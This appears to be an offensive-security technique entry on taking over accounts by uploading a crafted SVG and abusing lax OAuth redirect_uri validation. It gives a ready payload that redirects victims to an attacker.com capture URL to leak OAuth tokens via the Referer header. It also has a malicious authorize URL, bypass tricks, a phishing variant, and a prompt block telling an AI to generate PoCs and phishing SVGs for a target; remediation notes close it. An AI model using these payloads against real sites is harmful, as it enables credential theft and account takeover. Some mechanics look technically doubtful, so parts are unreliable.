---
id: "svg-abuse-account-takeover"
title: "SVG Abuse for Account Takeover Without XSS - Meta Referrer + OAuth Redirect Chains 2026"
type: "technique"
category: "web-application"
subcategory: "file-upload"
tags: ["svg", "account-takeover", "oauth", "referrer-policy", "meta-tag", "file-upload", "open-redirect", "phishing"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["open-redirect", "oauth-advanced", "file-upload", "svg-xss"]
difficulty: "advanced"
updated: "2026-05-04"
---

## Overview
When CSP blocks scripts (`script-src: none`), SVG uploads still enable ATO via HTML embedding capability + permissive OAuth redirect_uri validation. Use `<meta http-equiv="refresh">` or referrer policy meta to leak OAuth tokens in Referer header. High success rate for phishing too. Bypasses many "no XSS" assumptions.

## Primitives
1. **SVG Upload + Rendering**: App accepts SVG (common for logos, avatars). Renders inline or in viewer.
2. **OAuth Redirect URI Misconfig**: Apps accept any redirect_uri matching domain prefix (e.g., `https://target.com/*`) instead of exact match. Per RFC 6749, this is insecure.
3. **Referer Policy Override**: `<meta name="referrer" content="unsafe-url">` in SVG forces full URL (incl. query tokens) in Referer, overriding browser defaults (strict-origin-when-cross-origin).

## Exploitation Chain (Full ATO)
1. Create malicious SVG with:
   ```svg
   <svg><meta http-equiv="refresh" content="0;url=https://attacker.com/capture"><meta name="referrer" content="unsafe-url"></svg>
   ```
   Or use `<img>` / navigation to trigger.
2. Build OAuth auth URL with your SVG as `redirect_uri`: `https://oauth.provider/authorize?client_id=...&redirect_uri=https://target.com/evil.svg&...`
3. Victim follows link (phishing or direct), authenticates at provider.
4. Provider redirects to `https://target.com/evil.svg?code=TOKEN` (or access_token).
5. Browser loads SVG from target.com (trusted), meta fires, redirects to attacker with full Referer containing token.
6. Attacker exchanges token for session.

**Bonus Phishing**: SVG renders trusted login prompt on target domain for high conversion.

## Bypass Techniques
- If direct redirect blocked: Use on-domain open redirect first.
- CSP: Meta tags often allowed where scripts aren't.
- OAuth validation: Test `redirect_uri=https://target.com.evil.com/evil.svg` (subdomain) or path traversal variants.

## Deep Dig Prompts
```
Analyze target.com for SVG upload endpoints and OAuth flows. Generate:
1. Malicious SVG payload for token leakage via referrer meta.
2. Full OAuth authorize URL construction for 3 providers (Google, Discord, custom).
3. Test cases for redirect_uri validation bypass (exact match vs prefix).
4. Phishing SVG variant (fake login form lookalike).
5. Impact: "Complete account takeover without user interaction beyond clicking link".
6. Remediation for both SVG sanitization and OAuth config.
Output PoC + report-ready evidence steps.
```

## Remediation
- SVG: Block `image/svg+xml` via magic bytes or sanitize (strip `<meta>`, `<script>`, navigation tags). Serve from isolated origin.
- OAuth: Enforce exact string match on registered redirect_uris. No wildcards/paths.
- General: Strict Referrer-Policy on all responses.

## References
- 2026 Medium SVG abuse guides, OAuth RFC 6749 misconfigs, real bug bounty chains.
---
